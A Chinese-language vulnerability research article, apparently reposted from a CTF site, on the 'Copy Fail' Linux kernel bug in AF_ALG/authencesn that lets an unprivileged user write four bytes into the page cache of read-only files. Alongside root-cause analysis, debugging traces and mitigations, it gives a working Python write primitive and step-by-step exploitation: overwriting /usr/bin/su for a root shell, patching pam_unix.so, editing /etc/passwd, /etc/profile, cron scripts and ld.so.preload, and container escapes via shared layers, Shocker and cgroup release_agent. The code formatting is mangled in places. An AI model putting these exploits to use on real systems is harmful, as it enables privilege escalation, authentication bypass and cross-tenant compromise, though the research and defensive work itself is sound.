# Copy Fail 深度研究：Linux 页缓存漏洞的根因、利用与检测

> 原文: https://www.ctfiot.com/307687.html
> ID: 307687

一、引言

多次调用覆盖/usr/bin/su的 ELF 头部 → root shell

同一宿主机上不同 namespace 的容器共享镜像层的 page cache → 一个容器可以破坏另一个容器的二进制文件

文件只需O_RDONLY打开即可触发页面缓存写入 → readOnly volume 形同虚设

Docker/Kubernetes 的默认 seccomp profile 和 SELinux targeted 策略均不阻止漏洞利用

二、背景知识

Scatterlist (SGL) AEAD Crypto Page Cache | | | |scatterwalk AAD authencesn splice() | | | | +--------+-------+ | | | | | AF_ALG-------------+ | | | algif_aead--------------------------+

structscatterlist{unsignedlong page_link; // 指向 page 结构（或 CHAIN 到下一个 SGL 数组）unsignedint offset; // 页面内的起始偏移unsignedint length; // 数据长度};

import socket, osAF_ALG = 38SOL_ALG = 279
# 1. 创建 AF_ALG socket，指定使用的加密算法alg_sock = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
# 绑定算法名称，例如 AEAD 类型的 gcm(aes)alg_sock.bind(("aead","gcm(aes)"))alg_sock.setsockopt(SOL_ALG, 1, key_bytes) # ALG_SET_KEY: 设置密钥alg_sock.setsockopt(SOL_ALG, 4, None, 16) # ALG_SET_AEAD_AUTHSIZE: 设置 auth tag 大小
# 2. accept 获得一个操作用的 socketop_sock = alg_sock.accept()[0]# 3. 通过 sendmsg 发送待加密/解密的数据
# cmsg 中通过控制消息指定操作类型(加密/解密)、IV、AAD 长度等参数op_sock.sendmsg([plaintext_data], control_messages)
# 4. recv 获取加密/解密结果（内核在此时执行实际的加解密操作）result = op_sock.recv(output_buffer_size)

输入: AAD (Associated Data) || Ciphertext || Auth Tag输出: AAD || Plaintext

将序列号的高 32 位放在 AAD[4:8] 中

在计算 HMAC 之前，把 AAD[4:8]临时写入dst buffer 中 auth tag 原本所在的位置（这样 HMAC 计算就能覆盖完整序列号）

HMAC 完成后再还原

// crypto/authencesn.c - crypto_authenc_esn_decrypt()// 从 AAD 中读取前 8 字节scatterwalk_map_and_copy(tmp, req->dst,0,8,0);// 在 IPsec 场景: tmp[0] = SPI, tmp[1] = SeqNo_Hiunsigned int cryptlen = req->cryptlen;cryptlen -= authsize; // 定位到 auth tag 区域的起始// 将 AAD[4:8] 临时写入 dst 中 tag 区域，供 HMAC 计算使用scatterwalk_map_and_copy(tmp +1, req->dst, assoclen + cryptlen,4,1);// ^^^^^^^^ ^// AAD[4:8] 4字节, 1=写方向

三、漏洞成因分析

// 2017 之前: out-of-placeaead_request_set_crypt(&areq->aead_req, areq->tsgl, // req->src = TX SGL（输入数据） areq->first_rsgl.sgl.sg,// req->dst = RX SGL（用户接收 buffer） used, ctx->iv);

（memcpy_sglist），这样 AAD 就出现在输出中了

——因为 AEAD 解密需要读取 tag 来做认证校验，tag 不属于输出但必须在 dst SGL 中可达

（此时 RX SGL 已包含 AAD + 密文 + chained tag pages）

// 2017 之后的漏洞代码 (in-place)// Step 1: 复制 AAD+密文 到 RX buffermemcpy_sglist(rsgl, tsgl_src, outlen); // outlen = assoclen + cryptlen - authsize// Step 2: 从 TX SGL 中取出 tag pagesaf_alg_pull_tsgl(sk, processed, areq->tsgl, processed - as);// Step 3: 链到 RX SGL 尾部sg_chain(rsgl_sg, rsgl_nents, areq->tsgl);// Step 4: in-place — src 和 dst 都指向 这个 combined RX SGLaead_request_set_crypt(&areq->aead_req, rsgl_src, // req->src = RX SGL (含 chained tag pages) rsgl_dst, // req->dst = RX SGL (同一个!) used, ctx->iv);

（AAD 长度，通过 sendmsg 的控制消息指定）

（认证标签大小，通过setsockopt(ALG_SET_AEAD_AUTHSIZE)设置）

# 要写入的 4 字节数据evil_bytes = b'xdexadxbexef'# Step 1: 通过 sendmsg 发送 8 字节 AAD
# AAD[0:4] = 任意填充, AAD[4:8] = 要写入 page cache 的数据
# authencesn 会把 AAD[4:8] 作为 ESN seqno_lo 写入 scratch 区域aad = b'x00x00x00x00' + evil_bytes # 8 字节op.sendmsg([aad], cmsg, MSG_MORE) # MSG_MORE: 后续还有数据
# Step 2: 通过 splice 将目标文件的前 t+4 字节送入 AF_ALG socket
# splice 直接传递 page cache page 引用，不复制数据pipe_r, pipe_w = os.pipe()target_fd = os.open("/usr/bin/su", os.O_RDONLY)os.splice(target_fd, pipe_w, t + 4, offset_src=0) # 文件 → 管道os.splice(pipe_r, op.fileno(), t + 4) # 管道 → AF_ALG socket

TX SGL:+--------------------+----------------------------------------+|sendmsg data (8B) |splice data (t+4bytes) ||AAD:
4zero bytes |file[0:t+4] ||+evil_bytes |page cache page refs via splice || (kmalloc memory) |(pointstoGLOBALSHARED page cache!) |+--------------------+----------------------------------------+

= 前assoclen=8字节 = sendmsg 发送的x00x00x00x00+evil_bytes

= 中间t字节 = file[0:t]（文件的前 t 字节被当成”密文”）

= 最后authsize=4字节 = file[t:t+4]

outlen = assoclen + (cryptlen - authsize) =8+ ((t+4) -4) = t +8(1)memcpy_sglist(RX buffer, TX SGL, outlen=t+8):
Copyfirst t+8bytes of TX SGL to RXbuffer(user-space allocated memory) RX buffer contents: [0:8] = copy ofAAD(sendmsg data) [8:8+t] = copy of file[0:t] (ciphertext portion) Note: this is a DATA COPY, not a pagereference(2)af_alg_pull_tsgl(TX SGL, skip=t+8, take=4): Skip first t+8bytes of TX SGL, extract last4bytes(tag region) These4bytesinTX SGL correspond to file[t:t+4] from splice->SGL en
try: { page = file'spage cache page, offset = t%4096, length =4}->This is the ORIGINAL page cache reference, NOT a copy!(3)sg_chain(RX SGL tail, tag SGL): Chain the tag page reference to the end of RX SGL

combined dst SGL (=req->src=req->dst):+-- RX buffer (user-space, SAFE) ----+ +-- chained tag (PAGE CACHE!) ------+|||||AAD (8B) | ciphertext (tB) |->| file[t:t+4]inpage cache |||=copyoffile[0:t] || original pagereffromsplice |||||+-- offset 0 t+8 -----+ +-- offset t+8 t+12 -+

// crypto_authenc_esn_decrypt() 的 scratch write:// 先读取 AAD[0:8]scatterwalk_map_and_copy(tmp, req->dst,0,8,0); // tmp[0]=AAD[0:4], tmp[1]=AAD[4:8]unsigned int cryptlen = req->cryptlen; // = t + 4 (密文 + tag 的长度)cryptlen -= authsize; // = t + 4 - 4 = t// 将 tmp[1] (= AAD[4:8] = evil_bytes) 写入 dst[assoclen + cryptlen]scatterwalk_map_and_copy(tmp +1, req->dst, assoclen + cryptlen,4,1);// ^^^^^^^^ ^^^^^^^^^^^^^^^^ ^// = AAD[4:8] = 8 + t 写方向// = evil_bytes

RX buffer 部分占据 [0, t+8)，共 t+8 字节

chained tag pages 从偏移 t+8 开始

写入目标: file page cache[t : t+4]写入值: sendmsg 发送的 AAD[4:8] (4 字节, 完全可控)写入大小: 固定 4 字节 (authencesn 硬编码的 u32)触发条件: assoclen=8, authsize=4, splice 长度=t+4文件权限: 只需 O_RDONLY，不需要写权限根本原因: dst SGL 尾部 chained 的 tag pages 是 splice 引入的 page cache 原始引用

// 修复后: out-of-place// src = TX SGL (包含 page cache pages，但只读)// dst = RX SGL (纯用户空间 buffer)aead_request_set_crypt(&areq->aead_req, tsgl_src, // req->src = TX SGL rsgl_dst, // req->dst = RX SGL (独立!) used, ctx->iv);// AAD 通过显式 memcpy 复制到 RX buffermemcpy_sglist(rsgl_src, tsgl_src, ctx->aead_assoclen);

四、PoC 分析与动态验证

打开/usr/bin/su（SUID root binary）的只读 fd

多次调用page_cache_write_4bytes()，将/usr/bin/su的前 160 字节 ELF header 覆盖为一个精心构造的 ELF payload（包含一段获取 root shell 的 shellcode）

执行被篡改的/usr/bin/su→ 获得 root shell

AF_ALG =38SOL_ALG =279ASSOCLEN =8 # AAD 长度AUTHSIZE =4 # auth tag 大小 (也影响偏移计算)defpage_cache_write_4bytes(fd, offset, value):"""向 fd 指向文件的 page cache[offset : offset+4] 写入 value (4字节)"""# 创建 AF_ALG socket, 绑定 authencesn(hmac(sha256),cbc(aes)) 算法 s = socket.socket(AF_ALG, socket.SOCK_SEQPACKET,0) s.setsockopt(SOL_ALG,2, # ALG_SET_KEY: 密钥 (全零, 内容不影响漏洞触发)b'x08x00x01x00' # rtattr 头b'x00x00x00x10' # enckeylen=16 (AES-128) +b'x00'*32) # 16B authkey + 16B enckey s.setsockopt(SOL_ALG,4,None, AUTHSIZE) # ALG_SET_AEAD_AUTHSIZE = 4 op = s.accept()[0]# 构造 8 字节 AAD: 前 4B 填充零, 后 4B 是要写入 page cache 的 value
# authencesn 会把 AAD[4:8] (= value) 写入 dst[assoclen + cryptlen] aad =b'x00'*4+ value # 8 字节 op.sendmsg([aad], [(SOL_ALG,2,b'x00'*4), # ALG_OP_DECRYPT (SOL_ALG,3,b'x10'+b'x00'*19), # IV = 16B zero (SOL_ALG,4, struct.pack('I', ASSOCLEN))],# assoclen = 8 socket.MSG_MORE)
# 通过 splice 将目标文件的 [0, offset+4) 送入 AF_ALG socket
# splice 传递 page cache page 引用 (零拷贝) pr, pw = os.pipe() os.splice(fd, pw, offset + AUTHSIZE, offset_src=0) os.splice(pr, op.fileno(), offset + AUTHSIZE)try: op.recv(ASSOCLEN + offset) # 触发 _aead_recvmsg → authencesn scratch writeexceptOSError:
pass
# HMAC 校验失败返回 EBADMSG, 但 page cache 写入已完成 op.close(); s.close(); os.close(pr); os.close(pw)

# 构建内核 + busybox + PoC (通过 Docker，约 10 分钟)docker build -t copyfail-build -f Dockerfile .docker run --rm-v $(pwd)/output:/output copyfail-build
# 产出:# output/bzImage — 压缩内核 (4.8M)
# output/vmlinux — 带 DWARF 调试符号 (126M, 给 GDB 用)
# output/rootfs.cpio.gz — initramfs (含 busybox + poc_pagecache_write)

CONFIG_CRYPTO_USER_API_AEAD=y # AF_ALG AEAD 接口CONFIG_CRYPTO_AUTHENC=y # authenc 模块CONFIG_CRYPTO_SEQIV=y # 序列号 IVCONFIG_DEBUG_INFO_DWARF5=y # 完整调试符号CONFIG_GDB_SCRIPTS=y # GDB helper scriptsCONFIG_KALLSYMS_ALL=y # 所有内核符号可见

# 普通启动 (直接进入 shell)./run_qemu.sh
# 调试模式 (QEMU 暂停, 等待 GDB 连接到 :
1234)./run_qemu.sh debug

gdb ./vmlinux -ex'target remote :
1234'-ex'continue'

# === VM 内执行 ===# 1. 创建测试文件echo"AABBCCDD EEFFGGHH IIJJKKLL MMNNOOPP"> /tmp/target.txthexdump -C /tmp/target.txt
# 00000000 41 41 42 42 43 43 44 44 20 45 45 46 46 47 47 48 |AABBCCDD EEFFGGH|# 00000010 48 20 49 49 4a 4a 4b 4b 4c 4c 20 4d 4d 4e 4e 4f |H IIJJKKLL MMNNO|# 00000020 4f 50 50 0a |OPP.|# 2. 第一次写入: offset 0, value 0xDEADBEEFpoc_pagecache_write /tmp/target.txt 0 0xDEADBEEF
# [*] Target: /tmp/target.txt
# [*] Offset: 0 (0x0)
# [*] Value: 0xdeadbeef
# [*] Writing 4 bytes to page cache...# [+] Done. Page cache of /tmp/target.txt at offset 0 should now contain 0xdeadbeef
# 3. 验证写入结果hexdump -C /tmp/target.txt |head-2
# 00000000 ef be ad de 43 43 44 44 20 45 45 46 46 47 47 48 |....CCDD EEFFGGH|# ^^^^^^^^^^^# 0xDEADBEEF (little-endian)
# 4. 第二次写入: offset 8, value 0xCAFEBABEpoc_pagecache_write /tmp/target.txt 8 0xCAFEBABE
# 5. 验证两次写入互不干扰hexdump -C /tmp/target.txt |head-2
# 00000000 ef be ad de 43 43 44 44 be ba fe ca 46 47 47 48 |....CCDD....FGGH|# ^^^^^^^^^^^# 0xCAFEBABE (little-endian)
# 6. drop_caches 行为验证 (tmpfs 上的文件不会恢复)echo3 > /proc/sys/vm/drop_cacheshexdump -C /tmp/target.txt |head-2
# 00000000 ef be ad de 43 43 44 44 be ba fe ca 46 47 47 48 |....CCDD....FGGH|# ↑ tmpfs: 数据只存在于 page cache, drop_caches 不驱逐
# ↑ 磁盘文件系统 (ext4): drop_caches 后会从磁盘重新加载原始数据

# === 终端 1: 启动 QEMU (debug 模式) ===./run_qemu.sh debug
# === Debug mode: QEMU paused, waiting for GDB on localhost:
1234 ===# === 终端 2: 连接 GDB，加载 Python 断点脚本 ===gdb ./vmlinux -x exp3_2_gdb.py
# [GDB Script] Setting up breakpoints for Experiment 3.2+3.3...# Breakpoint 1 at 0xffffffff812984f8: file crypto/authencesn.c, line 263.# [GDB] BP1: crypto_authenc_esn_decrypt (entry)
# Breakpoint 2 at 0xffffffff8128f93e: file crypto/scatterwalk.c, line 57.# [GDB] BP2: scatterwalk_map_and_copy (writes only)(gdb) target remote :
1234(gdb)continue

===============================================================crypto_authenc_esn_decryptENTRY===req =0xffff888002d96a90req->src=0xffff888002d96820req->dst=0xffff888002d96820src==dst:
YES(IN-PLACE!) ←漏洞根因确认assoclen=8cryptlen=4(before-=authsize)============================================================---dstSGLentries---SGL[0]:
page_link=0xffffea000006f440offset=1760length=8SGL[1]:
page_link=0xffff8880027cbda1offset=0length=0[CHAIN]SGL[2]:
page_link=0xffffea000006f8c2offset=0length=4[LAST]===[HIT1]scatterwalk_map_and_copyWRITE===buf=0xffffc90000113d20sg=0xffff888002d96820start=4nbytes=4writing value:
0x41414141backtrace:#0 scatterwalk_map_and_copy#1 crypto_authenc_esn_decrypt ← seqno_hi 写入 dst[4..7]#2 _aead_recvmsg#3 aead_recvmsg#4 sock_recvmsg_nosec#5 sock_recvmsg===[HIT2]scatterwalk_map_and_copyWRITE===buf=0xffffc90000113d24sg=0xffff888002d96820start=8nbytes=4writing value:
0xdeadbeef ←★SCRATCH WRITE:
命中pagecache!backtrace:#0 scatterwalk_map_and_copy#1 crypto_authenc_esn_decrypt ← dst[assoclen+cryptlen] = dst[8+0] = page cache#2 _aead_recvmsg...===[HIT3]scatterwalk_map_and_copyWRITE===buf=0xffffc90000113cc8sg=0xffff888002d96820start=0nbytes=8writing value:
0x41414141backtrace:#0 scatterwalk_map_and_copy#1 crypto_authenc_esn_decrypt_tail ← ESN header 恢复 (HMAC 后清理)...

# 使用修复版内核启动BZIMAGE=bzImage.patched VMLINUX=vmlinux.patched ./run_qemu.sh debug

=============================================================== crypto_authenc_esn_decrypt ENTRY === req = 0xffff888002dcea90 req->src = 0xffff888002e6d880 req->dst = 0xffff888002dce820 src == dst: NO ← 修复: out-of-place 模式 assoclen = 8 cryptlen = 4 (before -= authsize)============================================================ --- dst SGL entries --- SGL[0]: page_link=0xffffea000006f582 offset=1760 length=8 [LAST] ^^^^ ↑ 仅 1 个 entry, 无 CHAIN, 无 page cache page!=== [HIT 1] scatterwalk_map_and_copy WRITE === writing value: 0x41414141 sg->page_link = 0xffffea000006f582 ← 写入 RX buffer (用户空间), 安全=== [HIT 2] scatterwalk_map_and_copy WRITE === writing value: 0xdeadbeef sg->page_link = 0xffffea000006f582 ← 同样写入 RX buffer, 无副作用

五、一个反复出现的漏洞模式：页缓存覆写

#修改前: testuser123:x:
1000:
1000::/home/testuser123:/bin/bashpython3 exp_passwd_uid.py testuser123#[+] SUCCESS: UID changed to 0000inpage cacheid testuser123#uid=0(root) gid=0(root)groups=0(root)su - testuser123#whoami→ root#可以读 /etc/shadow ✅#恢复echo 3 > /proc/sys/vm/drop_caches

; 密码校验后保存返回值0x3d5e: 89c5 mov %eax, %ebp ; 原始: 保存真实的校验结果; 修改为:
0x3d5e: 31ed xor %ebp, %ebp ; 篡改: 强制清零 = PAM_SUCCESS

python3 exp_pam_bypass.py
# [*] Auto-detected patch offset: 0x3d5e
# [*] Patching to: 31ede95e (xor %ebp,%ebp)
# [+] SUCCESS: pam_unix.so patched in page cachesu root
# Password: (任意输入)
# whoami → root ✅

#Step 1: 启动监控进程，持续读取 mmap 映射中的字符串gcc -o monitor exp_shared_lib_monitor.c -ldl./monitor &#[monitor] PID=161045#[monitor] initial:"/etc/hosts"#[monitor] tick 1: no change#[monitor] tick 2: no change#Step 2: 篡改 .so 的 page cache (另一终端)python3 exp_shared_lib.py#[+] SUCCESS:'/etc/hosts'→'/etc/h0sts'inpage cache#Step 3: 监控进程无需重启即检测到变化#[monitor] tick 3: *** STRING CHANGED ***#[monitor] now:"/etc/h0sts"#[monitor] *** LIVE-PATCH CONFIRMED (no restart) ***

#原始:# It's NOT a good idea to change this file unless you know what you#注入:id>>/tmp/CF-PWNED #ea to change this file unless you know what you
# ↑ 命令部分 ↑'#'注释掉剩余文本, 不影响后续行

python3 exp_profile_inject.py"id>>/tmp/CF-PWNED #"# [*] Payload: 20 bytes, 5 writes
# [+] SUCCESS: command injected into /etc/profile
# 触发: root 执行登录 shellsu - root -c"echo triggered"cat/tmp/CF-PWNED
# uid=0(root) gid=0(root) groups=0(root) ✅

#环境准备: cron job 每分钟执行 /tmp/copyfail-lab/cron_target.sh#脚本内容:
echo"ORIGINAL$(date +%s)">> cron.log#篡改脚本 page cachepython3 exp_cron_script.py /tmp/copyfail-lab/cron_target.sh#[+] SUCCESS: script tamperedinpage cache ("ORIGINAL"→"HIJACKED")#下一次 cron 触发 (≤ 1 分钟):
tail /tmp/copyfail-lab/cron.log#HIJACKED 1778309461 ← crond 执行了被篡改的脚本 ✅

#前提: 系统已有 /etc/ld.so.preload (用于性能监控等)cat /etc/ld.so.preload#/tmp/copyfail-lab/libmarker.sopython3 exp_preload_hijack.py#[+] SUCCESS: preload path hijacked#/tmp/copyfail-lab/libmarker.so → /tmp/copyfail-lab/libevil00.sols /dev/null#[preload] EVIL LIBRARY LOADED! ← 恶意库被每个新进程加载#/dev/null

六、容器场景深度研究

# 部署两个使用相同 base image 的 Podkubectl create ns copyfail-labkubectl apply -f pod-cross-tenant.yaml # 见 Gist
# 验证两个 Pod 共享同一 /etc/os-release inodekubectlexec-n copyfail-lab pod-attacker --stat-c'%i'/etc/os-release
# 208483846kubectlexec-n copyfail-lab pod-victim-same --stat-c'%i'/etc/os-release
# 208483846 ← 相同 inode = 共享 page cache

# 攻击者 Pod 中执行 PoCkubectlexec-n copyfail-lab pod-attacker -- python3 /poc_marker.py /etc/os-release
# [*] Target: /etc/os-release
# [*] Before: 50524554
# [*] After: deadbeef
# [+] SUCCESS: page cache corrupted! first 4 bytes = deadbeef
# 受害者 Pod (同 base image) — 立即看到被篡改的内容kubectlexec-n copyfail-lab pod-victim-same -- python3 -c"import os; print(os.pread(os.open('/etc/os-release',0),16,0).hex())"# deadbeef54595f4e414d453d22446562
# [+] MARKER FOUND: page cache is SHARED with attacker pod!# 对照组 (不同 base image) — 不受影响kubectlexec-n copyfail-lab pod-victim-alpine --head-c 16 /etc/os-release | xxd
# 00000000: 4e41 4d45 3d22 416c 7069 6e65 NAME="Alpine

# 宿主机读取 snapshot 层文件head-c 16 /var/lib/containerd/.../snapshots//fs/etc/os-release | xxd
# 00000000: dead beef 5459 5f4e 414d 453d 2244 6562 ....TY_NAME="Deb
# drop_caches 恢复echo3 > /proc/sys/vm/drop_cacheshead-c 16 /var/lib/containerd/.../snapshots//fs/etc/os-release | xxd
# 00000000: 5052 4554 5459 5f4e 414d 453d 2244 6562 PRETTY_NAME="Deb

# 创建两个完全隔离的 namespacekubectl create ns copyfail-lab # 攻击者kubectl create ns tenant-victim # 受害者
# 部署 Pod (见 Gist: pod-cross-tenant.yaml)kubectl apply -f pod-cross-tenant.yaml

# 两个不同 namespace 的 Pod, 相同 base image → 相同 inodekubectlexec-n copyfail-lab pod-attacker --stat-c'%i'/bin/cat
# 1420102kubectlexec-n tenant-victim victim-app --stat-c'%i'/bin/cat
# 1420102 ← 相同! 即使在不同 namespace

# Step 1: 确认受害者 /bin/cat 正常kubectlexec-n tenant-victim victim-app -- python3 -c"import os; print(os.pread(os.open('/bin/cat',0),16,0).hex())"# 7f454c46020101000000000000000000 (正常 ELF header)
# Step 2: 攻击者执行 Copy Fail (无任何特权!)kubectlexec-n copyfail-lab pod-attacker -- python3 /poc_marker.py /bin/cat
# [*] Before: 7f454c46
# [*] After: deadbeef
# [+] SUCCESS: page cache corrupted! first 4 bytes = deadbeef
# Step 3: 受害者立即受到影响kubectlexec-n tenant-victim victim-app -- python3 -c"import os; print(os.pread(os.open('/bin/cat',0),16,0).hex())"# deadbeef020101000000000000000000
# ↑ ELF magic 被破坏!# Step 4: 受害者服务中断kubectlexec-n tenant-victim victim-app --cat/etc/hostname
# exec /usr/bin/cat: exec format error ← 二进制无法执行
# Step 5: 恢复 (宿主机执行)echo3 > /proc/sys/vm/drop_cacheskubectlexec-n tenant-victim victim-app --cat/etc/hostname
# victim-app ← 恢复正常

# 1. 列出节点上所有 privileged 容器及其镜像crictl ps -o json | jq -r'.containers[] | "(.id) (.image.image) (.metadata.name)"'# 2. 对比业务 Pod 镜像与目标 DaemonSet 镜像的 layer digestMY_IMAGE="python:3.11-slim"TARGET_IMAGE="registry.k8s.io/kube-proxy:v1.35.2"crictl inspecti$MY_IMAGE| jq -r'.info.imageSpec.rootfs.diff_ids[]'> /tmp/my_layers.txtcrictl inspecti$TARGET_IMAGE| jq -r'.info.imageSpec.rootfs.diff_ids[]'> /tmp/target_layers.txtcomm-12 <(sort/tmp/my_layers.txt) <(sort/tmp/target_layers.txt)
# 有输出 → 存在共享层
# 3. 确认目标文件的 inode 是否真的被两个容器共享
# (在两个容器内分别执行)stat-c'%d:%i'/usr/sbin/ipset # 设备号:
inode号
# 两个容器输出相同 → page cache 共享确认

# 宿主机通过 snapshot 路径读取同一 inode — 读到篡改后的数据head-c 16 /var/lib/containerd/.../snapshots//fs/etc/os-release | xxd
# 00000000: dead beef 5459 5f4e 414d 453d 2244 6562 ....TY_NAME="Deb
# drop_caches 强制驱逐 page cache — 内核从磁盘重新加载echo3 > /proc/sys/vm/drop_cacheshead-c 16 /var/lib/containerd/.../snapshots//fs/etc/os-release | xxd
# 00000000: 5052 4554 5459 5f4e 414d 453d 2244 6562 PRETTY_NAME="Deb

在容器创建/启动过程中是否会在宿主机上下文中execve()或dlopen()snapshot 层中的文件？

（如 EDR、合规扫描）是否会执行容器层中的二进制、加载其.so、或解释执行其脚本？

# 追踪 runcinit进程读取文件时的 mount namespacebpftrace-e 'kprobe:
vfs_read/comm=="runc:[2:
INIT]"/{$task=(structtask_struct*)curtask;$mntns=$task->nsproxy->mnt_ns->ns.inum; printf("runc-init vfs_read mntns=%u file=%sn",$mntns, str(((structfile*)arg0)->f_path.dentry->d_name.name));}'&# 触发容器创建kubectl run test-probe--image=python:3.11-slim--restart=Never--sleep10
# 输出:# runc-initvfs_read mntns=4026533841file=passwd
# runc-initvfs_read mntns=4026533841file=group#↑mntns≠宿主机(4026531840), 说明已在容器 namespace 内

# 追踪 containerd 进程的 vfs_readbpftrace -e 'kprobe:
vfs_read /comm == "containerd"/ { printf("containerd vfs_read: %sn", str(((struct file *)arg0)->f_path.dentry->d_name.name));}' -- 60 # 监控 60 秒, 期间创建/删除容器
# 结果: 仅看到 config.json, meta.db 等元数据文件
# 从未读取 snapshot 层的 /bin/*, /etc/* 等文件内容

# Pod 配置 (见 Gist: pod-hostpath-escape.yaml)volumes:-name:
host-binhostPath:
path:/usr/bintype:
DirectoryvolumeMounts:-name:
host-binmountPath:/hostbinreadOnly:
true # ← 看似安全

# 确认 mount 确实是只读kubectlexec-n copyfail-lab hostpath-test -- mount | grep hostbin
# /dev/mapper/cl-root on /hostbin type xfs (ro,relatime,...)
# 常规写入被拒绝kubectlexec-n copyfail-lab hostpath-test --touch/hostbin/test
# touch: cannot touch '/hostbin/test': Read-only file system
# Copy Fail 绕过只读限制!kubectlexec-n copyfail-lab hostpath-test -- python3 /poc_marker.py /hostbin/ls
# [*] Before: 7f454c46
# [*] After: deadbeef
# [+] SUCCESS: page cache corrupted!# 宿主机验证ls
# bash: /usr/bin/ls: cannot execute binary file: Exec format error
# Exit code: 126

# 部署带 CAP_DAC_READ_SEARCH 的容器kubectlapply-f-<<EOFapiVersion:
v1kind:
Podmetadata:
name:
shocker-testnamespace:
copyfail-labspec:
containers:-name:
testimage:
python:3.11-slimcommand:["sleep","infinity"]securityContext:
capabilities:
add:["DAC_READ_SEARCH"]EOF

kubectl exec -n copyfail-lab shocker-test -- python3 -c "import os, struct, ctypes#1. Shocker: open_by_handle_at() 获取宿主机根目录 fdlibc = ctypes.CDLL('libc.so.6', use_errno=True)#... (构造 root inode handle, 调用 open_by_handle_at)#2. openat() 打开宿主机 /usr/bin/cat (只读即可)#3. Copy Fail 篡改 page cache"#实验输出:#[1] Host root fd: 4#[+] Host / contents: ['.autorelabel','bin','boot','dev','etc', ...]#[2] Host /usr/bin/cat fd: 7#[3] Before: 7f454c46020101000000000000000000#[4] After: deadbeef020101000000000000000000#[+] SUCCESS: Host /usr/bin/cat corrupted via Shocker + Copy Fail!

# 部署带 CAP_SYS_ADMIN 的容器kubectlapply-f-<<EOFapiVersion:
v1kind:
Podmetadata:
name:
sysadmin-testnamespace:
copyfail-labspec:
containers:-name:
testimage:
python:3.11-slimcommand:["sleep","infinity"]securityContext:
capabilities:
add:["SYS_ADMIN"]EOF

kubectl exec -n copyfail-lab sysadmin-test -- bash -c '# 挂载 cgroup 子系统mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrpmkdir /tmp/cgrp/x
# 确认 release_agent 可写echo 1 > /tmp/cgrp/x/notify_on_release
# 设置 release_agent 为容器 upperdir 中的脚本路径host_path=$(sed -n "s/.*upperdir=([^,]*).*/1/p" /proc/self/mountinfo)echo "$host_path/cmd" > /tmp/cgrp/release_agent
# 写入逃逸命令echo "#!/bin/sh" > /cmdecho"id > /tmp/cgrp/output; hostname >> /tmp/cgrp/output">> /cmdchmod +x /cmd
# 触发echo $$ > /tmp/cgrp/x/cgroup.procssleep 1 && echo 0 > /tmp/cgrp/x/cgroup.procssleep 1 && cat /tmp/cgrp/output'# uid=0(root) gid=0(root) groups=0(root)
# your-hostname
# ↑ 宿主机以 root 执行了命令

#通过 /proc/1/root/ 获取宿主机文件 fd，然后 Copy Fail 篡改kubectl exec -n copyfail-lab hostpid-test -- python3 -c "import osfd = os.open('/proc/1/root/usr/bin/cat', os.O_RDONLY)#... page_cache_write_4bytes(fd, 0, b'xdexadxbexef')"

docker run -d --name copyfail-test python:3.11-slimsleepinfinitydockercppoc_marker.py copyfail-test:/poc_marker.pydockerexeccopyfail-test python3 /poc_marker.py /usr/lib/os-release
# [+] SUCCESS: page cache corrupted! first 4 bytes = deadbeef
# page cache 被篡改期间导出 — 篡改数据固化到 tardockerexportcopyfail-test > tainted.tartar xf tainted.tar --to-stdout usr/lib/os-release |head-c 20 | xxd
# 00000000: dead beef 5459 5f4e 414d 453d 2244 6562 ....TY_NAME="Deb
# drop_caches 后重新导出 — 新的 tar 恢复原始数据echo3 > /proc/sys/vm/drop_cachesdockerexportcopyfail-test > clean.tartar xf clean.tar --to-stdout usr/lib/os-release |head-c 20 | xxd
# 00000000: 5052 4554 5459 5f4e 414d 453d 2244 6562 PRETTY_NAME="Deb
# 关键: 即使 page cache 已被清除, 第一个 tar 中的篡改数据永久存在tar xf tainted.tar --to-stdout usr/lib/os-release |head-c 20 | xxd
# 00000000: dead beef 5459 5f4e 414d 453d 2244 6562 ....TY_NAME="Deb ← 永久固化

# 重新篡改 page cachedockerexeccopyfail-test python3 /poc_marker.py /usr/lib/os-release
# commit 并从新镜像启动 — 读到篡改数据（来自 page cache）docker commit copyfail-test copyfail-committed:
testdocker run --rmcopyfail-committed:
testhead-c 20 /usr/lib/os-release | xxd
# 00000000: dead beef 5459 5f4e 414d 453d 2244 6562 ....TY_NAME="Deb
# drop_caches 后再启动 — 读到原始数据（从磁盘重新加载）echo3 > /proc/sys/vm/drop_cachesdocker run --rmcopyfail-committed:
testhead-c 20 /usr/lib/os-release | xxd
# 00000000: 5052 4554 5459 5f4e 414d 453d 2244 6562 PRETTY_NAME="Deb

docker diff copyfail-test#A /poc_marker.py ← 只显示 upper layer 变更#C /usr/local/lib/... ← Python 缓存文件
# ← /usr/lib/os-release 未出现！

LAYER=$(docker inspect copyfail-test --format'{{.GraphDriver.Data.LowerDir}}' |tr':''n'| xargs -I{} sh -c'test -f {}/usr/lib/os-release && echo {}'|head-1)head-c 16"$LAYER/usr/lib/os-release"| xxd -p
# deadbeef54595f4e414d453d22446562 ← 宿主机读 layer 路径 = 读 page cacheecho3 > /proc/sys/vm/drop_cacheshead-c 16"$LAYER/usr/lib/os-release"| xxd -p
# 5052455454595f4e414d453d22446562 ← drop_caches 后才能看到原始数据

七、防御缓解

4.14 ≤ kernel < 5.10.254

5.11 ≤ kernel < 5.15.204

5.16 ≤ kernel < 6.1.170

6.2 ≤ kernel < 6.6.137

6.7 ≤ kernel < 6.12.85

6.13 ≤ kernel < 6.18.22

6.19 ≤ kernel < 6.19.12

# 1. 检查内核版本是否在受影响范围uname-r
# 2. 检查 algif_aead 是可加载模块还是内建模块
# 有输出 → 可加载模块; 无输出 → 内建模块modinfo algif_aead 2>/dev/null &&echo"==> LOADABLE module"||echo"==> BUILT-IN or not present"# 3. 检查是否已有缓解措施
# Debian/Ubuntu: kmod 缓解grep -r algif_aead /etc/modprobe.d/ 2>/dev/null
# RHEL/CentOS: initcall_blacklistcat/proc/cmdline | grep -o'initcall_blacklist=[^ ]*'

# Debian/Ubuntu:
sudo apt update && sudo apt upgrade
# Alpine:
apk update && apk upgrade
# Arch:
pacman -Syu
# SUSE:
zypper update
# RHEL/CentOS:
sudo dnf update kernel && reboot
# Fedora:
sudo dnf upgrade --refresh && reboot

echo"install algif_aead /bin/false"| sudotee/etc/modprobe.d/disable-algif_aead.confsudo rmmod algif_aead 2>/dev/null || sudo reboot

grep CRYPTO_USER_API_AEAD /boot/config-$(uname-r)
# CONFIG_CRYPTO_USER_API_AEAD=y ← 内建! 非模块rmmod algif_aead 2>&1
# rmmod: ERROR: Module algif_aead is builtin.

